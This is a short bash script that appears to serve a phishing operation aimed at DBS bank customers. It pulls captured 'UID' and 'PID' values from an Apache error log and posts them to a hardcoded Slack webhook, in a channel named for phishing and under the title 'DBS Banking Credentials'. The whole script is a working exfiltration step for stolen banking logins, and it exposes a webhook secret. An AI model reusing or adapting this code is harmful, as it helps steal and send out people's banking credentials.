#!/usr/bin/env bash
#Main program
slackwebhook="https://hooks.slack.com/services/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"
read -d '' payload << EOF
{
	"channel": "#nus-phishing-dbs",
	"attachments": [
	    {
		"color": "good",
		"title": "DBS Banking Credentials", 
		"fields": [{
			"value": "$(cat /var/log/apache2/error.log | grep -e UID -e PID | sed 's/^.*://')",
			"short": false
		}]
	    }
	]
    }
EOF

curl -X POST -H 'Content-type: application/json' --data "${payload}" ${slackwebhook}
